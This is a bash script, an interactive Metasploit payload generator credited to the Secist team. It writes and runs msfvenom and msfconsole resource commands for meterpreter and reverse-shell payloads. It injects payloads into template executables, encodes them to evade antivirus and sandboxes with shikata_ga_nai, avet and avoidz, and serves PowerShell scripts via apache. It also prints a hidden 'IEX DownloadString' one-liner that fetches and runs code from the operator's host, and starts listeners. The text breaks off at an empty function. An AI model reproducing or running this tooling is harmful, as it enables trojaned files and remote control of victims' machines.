#!/bin/bash
  clear
  echo "   ____ _               _    _                   "
  echo "  / ___| |__   ___  ___| | _(_)_ __   __ _             "
  echo " | |   | '_ \ / _ \/ __| |/ / | '_ \ / _\ |            "
  echo " | |___| | | |  __/ (__|   <| | | | | (_| |  _   _   _ "
  echo "  \____|_| |_|\___|\___|_|\_\_|_| |_|\__/ | (_) (_) (_)"
  echo "                                     	|___/    "
  echo -e '-- -- +=[(c) 2017 | www.ggsec.cn | www.secist.com | Demon '

  echo -e "/==========================########========================\\"
  echo -e "|                             # v1.7                       |"
  echo -e "|                 Secist Anniversary Editionv1.7           |"
  echo -e "|       #Check the script. Just a moment, please.....      |"
  echo -e "|———————————#—————————————————#——————————————————#—————————|"
  echo -e "|                                            Demon 2017    |"
  echo -e "\==========================================================/"
  echo "   "
  sleep 1
  echo "   "
  #banner  Information output, detection procedures
  # check msfconsole
  which msfconsole > /dev/null 2>&1
  if [ "$?" -eq "0" ]; then
  msfconsole='1'
  else
  msfconsole='0'
  fi
  # check msfvenom
  which msfvenom > /dev/null 2>&1
  if [ "$?" -eq "0" ]; then
  msfvenom='1'
  else
  msfvenom='0'
  fi
  echo -n Check script  = =;
  sleep 1 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done
  if [ "$msfconsole" == "1" ] && [ "$msfvenom" == "1" ]   ;then
  echo -e " 【Already found】"
  echo ""
  echo ""
  echo -e 'msfconsole    【Already found】'
  echo -e 'msfvenom      【Already found】'
  echo ""
  sleep 2
  fi
  if [ "$msfconsole" == "0" ] || [ "$msfvenom" == "0" ]; then
  fail='1'
  echo -en "\b \e[0;31m【Fail】\e[0m"
  echo ""
  echo ""
  fi
  if [ "$msfconsole" == "0" ] ;then
  echo -e 'msfconsole    \e[0;31m【!!】 Not Found, first must be installed metasploit\e[0m';
  fi
  if [ "$msfvenom" == "0" ] ;then
  echo -e 'msfvenom      \e[0;31m【!!】 Not Found, first must be install metasploit\e[0m';
  fi
  #Determine whether the Metasploit is installed
  rm -rf resource
  rm -rf output
  mkdir resource
  mkdir output
  #Clear the cache directory, create the resource directory to place the RC file
  menu()
  {
  clear
  echo "              _     _                     _       _"
  echo "___  ___  ___(_)___| |_     ___  ___ _ __(_)_ __ | |_"
  echo "/ __|/ _ \/ __| / __| __|   / __|/ __| '__| | '_ \| __|"
  echo "\__ \  __/ (__| \__ \ |_    \__ \ (__| |  | | |_) | |_ "
  echo "|___/\___|\___|_|___/\__|___|___/\___|_|  |_| .__/ \__|"
  echo "        |_____|              |_|                      "
  echo "   "
  echo "                                                 v  1.6 "
  echo -e "/==========================########========================\\"
  echo -e "|               #My blog : www.ggsec.cn#                   |"
  echo -e "|               #Metasploit Payload Generator#             |"
  echo -e "|               #My first automated, simple script#        |"
  echo -e "|               ##Secist's blog: www.secist.com            |"
  echo -e "|———————————#—————————————————#——————————————————#—————————|"
  echo -e "|                Secist Anniversary Editionv1.7 | Demon 2017.7.14    |"
  echo -e "\==========================================================/"
  echo -e "  +------------++-------------------------++-----------------------+"
  echo -e "            Your IP address :\c"
  /sbin/ifconfig -a|grep inet|grep -v 127.0.0.1|grep -v inet6|awk '{print $2}'|tr -d "addr:"
  echo "            System version :$(cat /etc/issue)"
  echo -e "  +------------++-------------------------++-----------------------+"
  sleep 1
  echo "   "
  echo  "################################################################## "
  echo  "#   [1]  web_delivery(php)	       [2]  web_delivery(python) #"
  echo  "#   [3]  web_delivery(powershell)      [4]  文件注入Payload      #"
  echo  "#   [5]  bypass_server(powershell)     [6]  ps1encode            #"
  echo  "#   [7]  Avoidz Metasploit PAYLOAD     [8]  nishang_PAYLOAD (NC) #"
  echo  "#   [9]  Avet   Metasploit PAYLOAD     [10] About Me             #"
  echo  "#   [11] shellcode                     [12] exit                 #"
  echo  "################################################################## "
  echo -e "         secist> \c"
  read number
  case $number in
    1)
    echo -e "       secist> Enter your IP address: \c"
    read ip
    echo -e "       secist> Enter your port: \c"
    read port
    echo  "################################################################## "
    echo "use exploit/multi/script/web_delivery" >> resource/php.rc
    echo "set PAYLOAD php/meterpreter/reverse_tcp" >> resource/php.rc
    echo "set TARGET 1" >> resource/php.rc
    echo "set LHOST $ip" >> resource/php.rc
    echo "set LPORT $port" >> resource/php.rc
    echo "set URIPATH /" >> resource/php.rc
    echo "run" >> resource/php.rc
    msfconsole -r resource/php.rc
        ;;
    2)
    echo -e "       secist> Enter your IP address: \c"
    read ip
    echo -e "        secist> Enter your port: \c"
    read port
    echo  "################################################################## "
    echo "use exploit/multi/script/web_delivery" >> resource/python.rc
    echo "set LHOST $ip" >> resource/python.rc
    echo "set LPORT $port" >> resource/python.rc
    echo "set URIPATH /" >> resource/python.rc
    echo "run" >>resource/python.rc
    msfconsole -r resource/python.rc
        ;;
    3)
    echo -e "        secist> Enter your IP address: \c"
    read ip
    echo -e "        secist> Enter your port: \c"
    read port
    echo  "################################################################## "
    echo "use exploit/multi/script/web_delivery" >> resource/powershell.rc
    echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> resource/powershell.rc
    echo "set TARGET 2" >> resource/powershell.rc
    echo "set LHOST $ip" >> resource/powershell.rc
    echo "set LPORT $port" >> resource/powershell.rc
    echo "set URIPATH /" >> resource/powershell.rc
    echo "run" >> resource/powershell.rc
    msfconsole -r resource/powershell.rc
    ;;
    4)
    echo -e "         secist> Enter your IP address: \c"
    read ip
    echo -e "         secist> Enter your port: \c"
    read port
    echo -e "         secist>Please put the template file to the current directory and enter the name of the file you put in: \c"
    read file
    echo -e "         secist>Please enter the name of the file you saved: \c"
    read output
    echo " Please wait a few minutes, your fish will be released.=====================================》"
    echo  "################################################################## "
    echo ""
    sleep 2
    meun2
    msfvenom -a x86 --platform windows -x $file.exe -k -p windows/meterpreter/reverse_tcp  LHOST=$ip LPORT=$port –b “\ x00”  -f exe  >$output.exe
    sleep 1
    echo -e "Do you start the payload handler? y or n: \c"
    read handler
    if [ "$handler" == "y" ]; then
    echo "use exploit/multi/handler" >> resource/handler.rc
    echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> resource/handler.rc
    echo "set LHOST $ip" >>  resource/handler.rc
    echo "set LPORT $port" >>  resource/handler.rc
    echo "exploit " >>  resource/handler.rc
    msfconsole -r  resource/handler.rc
    fi
    ;;
    5)
    echo -e "       secist> Enter your IP address: \c"
    read ip
    echo -e "       secist> Enter your port: \c"
    read port
    echo  "################################################################## "
    echo "use exploit/windows/misc/regsvr32_applocker_bypass_server" >> resource/bypass.rc
    echo "set LHOST $ip" >> resource/bypass.rc
    echo "set LPORT $port" >> resource/bypass.rc
    echo "set URIPATH /" >> resource/bypass.rc
    echo "run" >> resource/bypass.rc
    msfconsole -r resource/bypass.rc
    ;;
    6)
      ps1encode
        ;;
    7)
     avoidz
       ;;
    8)
    echo -e "       secist> Enter your IP address: \c"
    read ip
    echo -e "        secist> Enter your port: \c"
    read port
    #Enter IP and port
    cp Invoke-PowerShellTcp.ps1 output/Invoke-PowerShellTcp.ps1
    #Copy the PowerShell script into the output directory
    echo Invoke-PowerShellTcp -Reverse -IPAddress $ip -Port $port >> output/Invoke-PowerShellTcp.ps1
    #Write PAYLOAD into the script
    cp output/Invoke-PowerShellTcp.ps1 /var/www/html
    service apache2 start
    #And copy our scripts into the apche directory and open the web port
    echo  "####################################################################################################################################  "
    echo " "
    echo "[*]powershell -windowstyle hidden IEX (New-Object Net.WebClient).DownloadString('http://$ip/Invoke-PowerShellTcp.ps1');"
    echo " "
    echo  "####################################################################################################################################  "
    #"Echo" output of our PowerShell download address, my docker web80 port corresponds to 8081 of the machine, so I need to manually add here, you don't need to do this in Kali, but you can modify
    nc -vv -l -p $port
    #And turn on our NC monitor
    ;;
    9)
    Avet
    ;;
    10)
      menu1
      ;;
    11)
    shellcode
    ;;
    12)
    exit
    ;;
    *)
    menu
    ;;
    esac

}
#Here is the main menu function, enter 6 to return second-level menu and enter other options to return the main menu again.
ps1encode (){
clear

echo  -e "         < Powershell Payload >"
echo  -e "          --------------------"
echo -e "                             \   ^__^             "
echo -e "                              \  (oo)\_______     "
echo -e "                                 (__)\       )\/\ "
echo -e "                                     ||----w |    "
echo -e "                                     ||     ||     "
echo "  "
echo -e "  +------------++-------------------------++-----------------------+"
echo      "             Secist Anniversary Editionv1.7 (secist----2017.7.14)"
echo " "
echo -e "            Your IP address :\c"
/sbin/ifconfig -a|grep inet|grep -v 127.0.0.1|grep -v inet6|awk '{print $2}'|tr -d "addr:"
echo "            System version :$(cat /etc/issue)"
echo -e "  +------------++-------------------------++-----------------------+"
echo "  "
echo "        [1] Meterpreter_Reverse_tcp		 [5] Shell_reverse_tcp"
echo "        [2] Meterpreter_Reverse_http		 [6] Powershell_reverse_tcp"
echo "        [3] Meterpreter_Reverse_https		 [7] Multi encode payload"
echo "        [4] Meterpreter_Reverse_tcp_dns          [8]cmd/windows/reverse_powershell  "
echo "        [9] exit                                 [10] back meun     "
echo ""
echo -e "              secist> \c"
read option

#Aukeratu
case $option in
1)
payload='windows/meterpreter/reverse_tcp'
;;
2)
payload='windows/meterpreter/reverse_http'
;;
3)
payload='windows/meterpreter/reverse_https'
;;
4)
payload='windows/meterpreter/reverse_tcp_dns'
;;
5)
payload='windows/shell/reverse_tcp'
;;
6)
payload='windows/powershell_reverse_tcp'
;;
7)
payload='windows/meterpreter/reverse_tcp'
;;
8)
payload='cmd/windows/reverse_powershell'
;;
9)
exit
;;
10)
menu
;;
*)
ps1encode
;;
esac
if [ "$option" == "1" ]; then
  code

elif [ "$option" == "2" ]; then
  code

elif [ "$option" == "3" ]; then
   code

elif [ "$option" == "4" ]; then
  code

elif [ "$option" == "5" ]; then
  code

elif [ "$option" == "6" ]; then
    code

elif [ "$option" == "7" ]; then
  code
elif [ "$option" == "8" ]; then
  echo -e "       secist> Enter your IP address: \c"
  read ip
  echo -e "       secist> Enter your port: \c"
  read port
  echo -e  "        secist>Please enter the name of the file you want to save：\c "
  read output
   msfvenom -p $payload LHOST=$ip LPORT=$port -o output/$output.bat
   echo " Please wait a few minutes, your fish will be released.=====================================》"
   echo  "################################################################## "
   clear
   echo -e "  +------------++-------------------------++-----------------------+"
   echo -e "  | Name       ||  Descript   	          || Your Input             "
   echo -e "  +------------++-------------------------++-----------------------+"
   echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
   echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
   echo -e "  | OUTPUTNAME ||  The Filename output    || output/$output.bat     "
   echo -e "  +------------++-------------------------++-----------------------+"
   echo "use exploit/multi/handler" >> resource/handler.rc
   echo "set PAYLOAD $payload" >> resource/handler.rc
   echo "set LHOST $ip" >>  resource/handler.rc
   echo "set LPORT $port" >>  resource/handler.rc
   echo "exploit " >>  resource/handler.rc
   msfconsole -r  resource/handler.rc
fi
}
menu1()
{
clear
echo -e "_______________________________________________________________________"
echo -e "    I'm a member of the Secist Team, Demon.I usually active in the BUGBACK, Ichunqiu, and other platforms. Major in web security, Hackintosh and Kali penetration testing, etc. I'm currently concentrating on metaspolit research, and I'd like to share some of my learning ideas and experiences with this tutorial."
echo -e "    For any questions about the course, you can contact us by the following ways:  "
echo      "             Secist Anniversary Editionv1.7 (secist----2017.7.14)"
echo -e "                     < My Blog: www.ggsec.cn >"
echo -e "                    < My Team Blog: www.secist.com>"
echo "                       Secist's QQ group：532925486 "
echo "                       Welcome to use my script v1.7"
echo "            Ps:Please indicate the author when you change the code             "
echo "                           Translator ：Sid                   "
echo -e "---------------------------------------------------------------------- "
echo -e "                             \   ^__^             "
echo -e "                              \  (oo)\_______     "
echo -e "                                 (__)\       )\/\ "
echo -e "                                     ||----w |    "
echo -e "                                     ||     ||     "
echo "  "
echo  "################################################################## "
echo  "#                           [1]back meun                          #"
echo  "#                           [2]exit                               #"
echo  "################################################################## "
echo "  "
echo -e "                         secist> \c"
read number
case $number in
#second-level menu function
    1)
        menu
        ;;
    2)
    exit
    ;;
    *)
      menu1
        ;;
    esac

}

code(){
#Defines a menu called code
  echo -e "       secist> Enter your IP address: \c"
  read ip
  echo -e "       secist> Enter your port: \c"
  read port
./ps1encode.rb -i $ip -p $port -a $payload -t cmd
#对shellcode 输出
echo ""
echo -e "Do you outputfile (ps1)? y or n: \c"
read ps1
if [ "$ps1" == "y" ]; then
echo -e  "        secist>Please enter the name of the file you want to save：\c "
read output
#Select y and save the file
echo " Please wait a few minutes, your fish will be released.=====================================》"
echo  "################################################################## "
echo $(./ps1encode.rb -i $ip -p $port -a windows/meterpreter/reverse_tcp -t cmd) >>output/$output.ps1
cp output/$output.ps1 /var/www/html
service apache2 start
echo  "################################################################## "
#Save the output code to the output folder and save the custom script
clear
echo -e "  +------------++-------------------------++-----------------------+"
echo -e "  | Name       ||  Descript   	          || Your Input              "
echo -e "  +------------++-------------------------++-----------------------+"
echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
echo -e "  | OUTPUTNAME ||  The Filename output    || output/$output.ps1     "
echo -e "  +------------++-------------------------++-----------------------+"
echo  "####################################################################################################################################  "
echo " "
echo "[*]powershell -windowstyle hidden IEX (New-Object Net.WebClient).DownloadString('http://$ip/$output.ps1');"
echo " "
echo  "####################################################################################################################################  "
echo "use exploit/multi/handler" >> resource/handler.rc
echo "set PAYLOAD $payload" >> resource/handler.rc
echo "set LHOST $ip" >>  resource/handler.rc
echo "set LPORT $port" >>  resource/handler.rc
echo "exploit -j " >>  resource/handler.rc
msfconsole -r  resource/handler.rc
#Select Y - - save the output as a custom file, and execute the MSF monitor module
elif [ "$ps1" == "n" ]; then
echo "use exploit/multi/handler" >> resource/handler.rc
echo "set PAYLOAD $payload" >> resource/handler.rc
echo "set LHOST $ip" >>  resource/handler.rc
echo "set LPORT $port" >>  resource/handler.rc
echo "exploit -j" >>  resource/handler.rc
msfconsole -r  resource/handler.rc
fi
#Select N, the MSF listening module will be executed directly
}



avoidz (){
clear

echo  -e "         < avoidz Payload >"
echo  -e "          --------------------"
echo -e "                             \   ^__^             "
echo -e "                              \  (oo)\_______     "
echo -e "                                 (__)\       )\/\ "
echo -e "                                     ||----w |    "
echo -e "                                     ||     ||     "
echo "  "
echo -e "  +------------++-------------------------++-----------------------+"
echo      "             Secist Anniversary Editionv1.7 (secist----2017.7.14)"
echo " "
echo -e "            Your IP address :\c"
/sbin/ifconfig -a|grep inet|grep -v 127.0.0.1|grep -v inet6|awk '{print $2}'|tr -d "addr:"
echo "            System version :$(cat /etc/issue)"
echo -e "  +------------++-------------------------++-----------------------+"
echo " "
echo "        [1] Meterpreter_Reverse_tcp		 [5] Shell_reverse_tcp"
echo "        [2] Meterpreter_Reverse_http		 [6] Powershell_reverse_tcp"
echo "        [3] Meterpreter_Reverse_https		 [7] Multi encode payload"
echo "        [4] Meterpreter_Reverse_tcp_dns          [8] exit        "
echo "        [9] back meun     "
echo ""
echo -e "              secist> \c"
read option

#Aukeratu
case $option in
1)
payload='windows/meterpreter/reverse_tcp'
;;
2)
payload='windows/meterpreter/reverse_http'
;;
3)
payload='windows/meterpreter/reverse_https'
;;
4)
payload='windows/meterpreter/reverse_tcp_dns'
;;
5)
payload='windows/shell/reverse_tcp'
;;
6)
payload='windows/powershell_reverse_tcp'
;;
7)
payload='windows/meterpreter/reverse_tcp'
;;
8)
exit
;;
9)
menu
;;
*)
avoidz
;;
esac
if [ "$option" == "1" ]; then
  code1

elif [ "$option" == "2" ]; then
  code1

elif [ "$option" == "3" ]; then
   code1

elif [ "$option" == "4" ]; then
  code1

elif [ "$option" == "5" ]; then
  code1

elif [ "$option" == "6" ]; then
    code1

elif [ "$option" == "7" ]; then
  code1
fi
}
code1(){
  rm /root/temp1.exe
  echo -e "       secist> Enter your IP address: \c"
  read ip
  echo -e "       secist> Enter your port: \c"
  read port
  echo " Please wait a few minutes, your fish will be released.=====================================》"
  echo  "################################################################## "
  ruby avoidz.rb -h $ip -p $port -m $payload -f temp1
  echo  "################################################################## "
  clear
  echo -e "  +------------++-------------------------++-----------------------+"
  echo -e "  | Name       ||  Descript   	          || Your Input              "
  echo -e "  +------------++-------------------------++-----------------------+"
  echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
  echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
  echo -e "  | OUTPUTNAME ||  The Filename output    || /root/temp1.exe      "
  echo -e "  +------------++-------------------------++-----------------------+"
  echo "use exploit/multi/handler" >> resource/handler.rc
  echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> resource/handler.rc
  echo "set LHOST $ip" >>  resource/handler.rc
  echo "set LPORT $port" >>  resource/handler.rc
  echo "exploit -j" >>  resource/handler.rc
  msfconsole -r  resource/handler.rc
}

Avet (){
clear

echo  -e "         < Avet Payload >"
echo  -e "          --------------------"
echo -e "                             \   ^__^             "
echo -e "                              \  (oo)\_______     "
echo -e "                                 (__)\       )\/\ "
echo -e "                                     ||----w |    "
echo -e "                                     ||     ||     "
echo " "
echo -e "  +------------++-------------------------++-----------------------+"
echo      "             Secist Anniversary Editionv1.7 (secist----2017.7.14)"
echo " "
echo -e "            Your IP address :\c"
/sbin/ifconfig -a|grep inet|grep -v 127.0.0.1|grep -v inet6|awk '{print $2}'|tr -d "addr:"
echo "            System version :$(cat /etc/issue)"
echo -e "  +------------++-------------------------++-----------------------+"
echo "  "
echo "        [1]  build_win32_meterpreter_rev_https_20xshikata              "
echo "        [2]  build_win32_meterpreter_rev_https_shikata_fopen           "
echo "        [3]  build_win32_meterpreter_unstaged_rev_https_20xshikata "
echo "        [4]  build_win32_shell_rev_tcp_shikata_fopen_kaspersky"
echo "        [5]  build_win32_meterpreter_rev_https_fopen_shikata"
echo "        [6]  build_win64_meterpreter_rev_tcp_xor"
echo "        [7]  build_win64_meterpreter_rev_tcp_xor_fopen"
echo "        [8]  exit "
echo "        [9]  back meun  "

echo ""
echo -e "              secist> \c"
read option

#Aukeratu
case $option in
1)

echo " "
echo -e "       secist> Enter your IP address: \c"
read ip
echo -e "       secist> Enter your port: \c"
read port
#build_win32_meterpreter_rev_https_20xshikata.sh
. avet/build/global_win32.sh
# make meterpreter reverse payload, encoded 20 rounds with shikata_ga_nai
msfvenom -p windows/meterpreter/reverse_https lhost=$ip lport=$port -e x86/shikata_ga_nai -i 20 -f c -a x86 --platform Windows > avet/sc.txt
# call make_avet, the sandbox escape is due to the many rounds of decoding the shellcode
./avet/make_avet -f avet/sc.txt
# compile to pwn.exe file
$win32_compiler -o output/pwn.exe avet.c
# cleanup
echo "" > avet/defs.h
echo  "################################################################## "
service postgresql start
clear
echo -e "  +------------++-------------------------++-----------------------+"
echo -e "  | Name       ||  Descript   	          || Your Input              "
echo -e "  +------------++-------------------------++-----------------------+"
echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
echo -e "  | OUTPUTNAME ||  The Filename output    || output/pwn.exe          "
echo -e "  +------------++-------------------------++-----------------------+"
echo "use exploit/multi/handler" >> resource/handler.rc
echo "set PAYLOAD windows/meterpreter/reverse_https" >> resource/handler.rc
echo "set LHOST $ip" >>  resource/handler.rc
echo "set LPORT $port" >>  resource/handler.rc
echo "exploit -j" >>  resource/handler.rc
msfconsole -r  resource/handler.rc
;;
2)
echo -e "       secist> Enter your IP address: \c"
read ip
echo -e "       secist> Enter your port: \c"
read port
#build_win32_meterpreter_rev_https_shikata_fopen.sh
# simple example script for building the .exe file
# include script containing the compiler var $win32_compiler
# you can edit the compiler in build/global_win32.sh
# or enter $win32_compiler="mycompiler" here
. avet/build/global_win32.sh
# make meterpreter reverse payload, encoded with shikata_ga_nai
# additionaly to the avet encoder, further encoding should be used
msfvenom -p windows/meterpreter/reverse_https lhost=$ip lport=$port -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > avet/sc.txt
# format the shellcode for make_avet
./avet/format.sh avet/sc.txt > avet/scclean.txt && rm avet/sc.txt
# call make_avet, the -f compiles the shellcode to the exe file, the -F is for the AV sandbox evasion
./avet/make_avet -f avet/scclean.txt -F -E
# compile to pwn.exe file
$win32_compiler -o output/pwn.exe avet.c
# cleanup
rm avet/scclean.txt && echo "" > avet/defs.h
service postgresql start
echo  "################################################################## "
service postgresql start
clear
echo -e "  +------------++-------------------------++-----------------------+"
echo -e "  | Name       ||  Descript   	          || Your Input              "
echo -e "  +------------++-------------------------++-----------------------+"
echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
echo -e "  | OUTPUTNAME ||  The Filename output    || output/pwn.exe          "
echo -e "  +------------++-------------------------++-----------------------+"
echo "use exploit/multi/handler" >> resource/handler.rc
echo "set PAYLOAD windows/meterpreter/reverse_https" >> resource/handler.rc
echo "set LHOST $ip" >>  resource/handler.rc
echo "set LPORT $port" >>  resource/handler.rc
echo "exploit -j" >>  resource/handler.rc
msfconsole -r  resource/handler.rc
;;
3)
echo -e "       secist> Enter your IP address: \c"
read ip
echo -e "       secist> Enter your port: \c"
read port
#build_win32_meterpreter_unstaged_rev_https_20xshikata
. avet/build/global_win32.sh
# make meterpreter unstaged reverse payload, encoded 20 rounds with shikata_ga_nai
msfvenom -p windows/meterpreter_reverse_https lhost=$ip lport=$port extensions=stdapi,priv -e x86/shikata_ga_nai -i 20 -f c -a x86 --platform Windows > avet/sc.txt
# call make_avet, the sandbox escape is due to the many rounds of decoding the shellcode
./avet/make_avet -f avet/sc.txt
# compile to pwn.exe file
$win32_compiler -o output/pwn.exe avet.c
# cleanup
echo "" > defs.h

service postgresql start
echo  "################################################################## "
clear
echo -e "  +------------++-------------------------++-----------------------+"
echo -e "  | Name       ||  Descript   	          || Your Input              "
echo -e "  +------------++-------------------------++-----------------------+"
echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
echo -e "  | OUTPUTNAME ||  The Filename output    || output/pwn.exe          "
echo -e "  +------------++-------------------------++-----------------------+"
echo "use exploit/multi/handler" >> resource/handler.rc
echo "set PAYLOAD windows/meterpreter_reverse_https" >> resource/handler.rc
echo "set LHOST $ip" >>  resource/handler.rc
echo "set LPORT $port" >>  resource/handler.rc
echo "exploit -j" >>  resource/handler.rc
msfconsole -r  resource/handler.rc
;;
4)
echo -e "       secist> Enter your IP address: \c"
read ip
echo -e "       secist> Enter your port: \c"
read port
#build_win32_shell_rev_tcp_shikata_fopen_kaspersky.sh
. avet/build/global_win32.sh
# make meterpreter unstaged reverse payload, encoded 20 rounds with shikata_ga_nai
msfvenom -p windows/meterpreter_reverse_https lhost=$ip lport=$port extensions=stdapi,priv -e x86/shikata_ga_nai -i 20 -f c -a x86 --platform Windows > avet/sc.txt
# call make_avet, the sandbox escape is due to the many rounds of decoding the shellcode
./avet/make_avet -f avet/sc.txt
# compile to pwn.exe file
$win32_compiler -o output/pwn.exe avet.c
# cleanup
echo "" > defs.h
service postgresql start
echo  "################################################################## "
clear
echo -e "  +------------++-------------------------++-----------------------+"
echo -e "  | Name       ||  Descript   	          || Your Input              "
echo -e "  +------------++-------------------------++-----------------------+"
echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
echo -e "  | OUTPUTNAME ||  The Filename output    || output/pwn.exe          "
echo -e "  +------------++-------------------------++-----------------------+"
echo "use exploit/multi/handler" >> resource/handler.rc
echo "set PAYLOAD windows/meterpreter/reverse_https" >> resource/handler.rc
echo "set LHOST $ip" >>  resource/handler.rc
echo "set LPORT $port" >>  resource/handler.rc
echo "exploit -j" >>  resource/handler.rc
msfconsole -r  resource/handler.rc
;;
5)
echo -e "       secist> Enter your IP address: \c"
read ip
echo -e "       secist> Enter your port: \c"
read port
#build_win32_meterpreter_rev_https_fopen_shikata.sh
. avet/build/global_win32.sh
msfvenom -p windows/meterpreter/reverse_https lhost=$ip lport=$port -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > avet/sc.txt
#. avet/format.sh sc.txt > scclean.txt && rm sc.txt
#cat sc.txt >> avet/defs.h
#echo "" > avet/scclean.txt
./avet/make_avet -f avet/sc.txt -F -p
$win32_compiler -o output/pwn.exe avet.c
#echo "" > avet/defs.h
service postgresql start
echo  "################################################################## "
clear
echo -e "  +------------++-------------------------++-----------------------+"
echo -e "  | Name       ||  Descript   	          || Your Input              "
echo -e "  +------------++-------------------------++-----------------------+"
echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
echo -e "  | OUTPUTNAME ||  The Filename output    || output/pwn.exe          "
echo -e "  +------------++-------------------------++-----------------------+"
echo "use exploit/multi/handler" >> resource/handler.rc
echo "set PAYLOAD windows/meterpreter/reverse_https" >> resource/handler.rc
echo "set LHOST $ip" >>  resource/handler.rc
echo "set LPORT $port" >>  resource/handler.rc
echo "exploit -j" >>  resource/handler.rc
msfconsole -r  resource/handler.rc
;;

6)
echo -e "       secist> Enter your IP address: \c"
read ip
echo -e "       secist> Enter your port: \c"
read port
#build_win64_meterpreter_rev_tcp_xor
. avet/build/global_win64.sh
# make meterpreter reverse payload
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=$ip lport=$port -e x64/xor -f c --platform Windows > avet/sc.txt
# format the shellcode for make_avet
./avet/format.sh avet/sc.txt > avet/scclean.txt && rm avet/sc.txt
# call make_avet, compile
./avet/make_avet -f avet/scclean.txt -X -E
$win64_compiler -o output/pwn.exe avet.c
# cleanup
rm avet/scclean.txt && echo "" > avet/defs.h

service postgresql start
echo  "################################################################## "
clear
echo -e "  +------------++-------------------------++-----------------------+"
echo -e "  | Name       ||  Descript   	          || Your Input              "
echo -e "  +------------++-------------------------++-----------------------+"
echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
echo -e "  | OUTPUTNAME ||  The Filename output    || output/pwn.exe          "
echo -e "  +------------++-------------------------++-----------------------+"
echo "use exploit/multi/handler" >> resource/handler.rc
echo "set PAYLOAD windows/x64/meterpreter/reverse_tcp" >> resource/handler.rc
echo "set LHOST $ip" >>  resource/handler.rc
echo "set LPORT $port" >>  resource/handler.rc
echo "exploit -j" >>  resource/handler.rc
msfconsole -r  resource/handler.rc
;;
7)
echo -e "       secist> Enter your IP address: \c"
read ip
echo -e "       secist> Enter your port: \c"
read port
# build_win64_meterpreter_rev_tcp_xor_fopen.sh
. avet/build/global_win64.sh
# make meterpreter reverse payload
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=$ip -e x64/xor lport=$port -f c --platform Windows > avet/sc.txt
./avet/make_avet -f avet/sc.txt -F -X
$win64_compiler -o output/pwn.exe avet.c
# cleanup
rm avet/sc.txt && echo "" > avet/defs.h
service postgresql start
echo  "################################################################## "
clear
echo -e "  +------------++-------------------------++-----------------------+"
echo -e "  | Name       ||  Descript   	          || Your Input              "
echo -e "  +------------++-------------------------++-----------------------+"
echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
echo -e "  | OUTPUTNAME ||  The Filename output    || output/pwn.exe          "
echo -e "  +------------++-------------------------++-----------------------+"
echo "use exploit/multi/handler" >> resource/handler.rc
echo "set PAYLOAD windows/x64/meterpreter/reverse_tcp" >> resource/handler.rc
echo "set LHOST $ip" >>  resource/handler.rc
echo "set LPORT $port" >>  resource/handler.rc
echo "exploit -j" >>  resource/handler.rc
msfconsole -r  resource/handler.rc
;;
8)
exit
;;
*)
menu
;;
  esac
}
meun2 (){
  clear
echo -e "  +------------++-------------------------++-----------------------+"
echo -e "  | Name       ||  Descript   	          || Your Input              "
echo -e "  +------------++-------------------------++-----------------------+"
echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
echo -e "  | OUTPUTNAME ||  The Filename output    || $output.exe            "
echo -e "  +------------++-------------------------++-----------------------+"
}

shellcode (){
clear

echo  -e "         < Avet Payload >"
echo  -e "          --------------------"
echo -e "                             \   ^__^             "
echo -e "                              \  (oo)\_______     "
echo -e "                                 (__)\       )\/\ "
echo -e "                                     ||----w |    "
echo -e "                                     ||     ||     "
echo " "
echo -e "  +------------++-------------------------++-----------------------+"
echo      "             Secist Anniversary Editionv1.7 (secist----2017.7.14)"
echo " "
echo -e "            Your IP address :\c"
/sbin/ifconfig -a|grep inet|grep -v 127.0.0.1|grep -v inet6|awk '{print $2}'|tr -d "addr:"
echo "            System version :$(cat /etc/issue)"
echo -e "  +------------++-------------------------++-----------------------+"
echo "  "
echo "        [1] Meterpreter_Reverse_tcp		 [5] Shell_reverse_tcp"
echo "        [2] Meterpreter_Reverse_http	         [6] exit"
echo "        [3] Meterpreter_Reverse_https		 "
echo "        [4] Meterpreter_Reverse_tcp_dns          "
echo "        [7] back meun     "
echo ""
echo -e "              secist> \c"
read option

#Aukeratu
case $option in
1)
payload='windows/meterpreter/reverse_tcp'
;;
2)
payload='windows/meterpreter/reverse_http'
;;
3)
payload='windows/meterpreter/reverse_https'
;;
4)
payload='windows/meterpreter/reverse_tcp_dns'
;;
5)
payload='windows/shell/reverse_tcp'
;;
6)
exit
;;
7)
menu
;;
*)
shellcode
;;
esac
if [ "$option" == "1" ]; then
  shellcode1

elif [ "$option" == "2" ]; then
  shellcode1

elif [ "$option" == "3" ]; then
  shellcode1
  
elif [ "$option" == "4" ]; then
  shellcode1

elif [ "$option" == "5" ]; then
  shellcode1

 elif [ "$option" == "6" ]; then
    exit

 elif [ "$option" == "7" ]; then
    menu
  fi
}

shellcode1(){
#定义了一个菜单为shellcode1
